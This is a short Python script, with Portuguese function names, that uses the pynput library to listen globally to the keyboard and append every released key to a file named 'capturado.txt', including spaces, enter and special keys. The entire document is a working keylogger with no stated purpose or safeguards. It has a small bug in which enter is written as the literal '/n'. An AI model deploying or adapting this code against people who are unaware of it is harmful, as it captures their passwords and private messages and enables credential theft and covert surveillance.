from pynput import keyboard

def pressionado(Key):
    pass

def soltado(Key):
    with open('capturado.txt', 'a') as file:
        try:
            file.write(str(f'{Key.char}'))
        except AttributeError:
            if Key == keyboard.Key.space:
                file.write(' ')
            elif Key == keyboard.Key.enter:
                file.write('/n')
            else:
                file.write(str(f'({Key})'))

with keyboard.Listener(on_press=pressionado, on_release=soltado) as listener:
    listener.join()
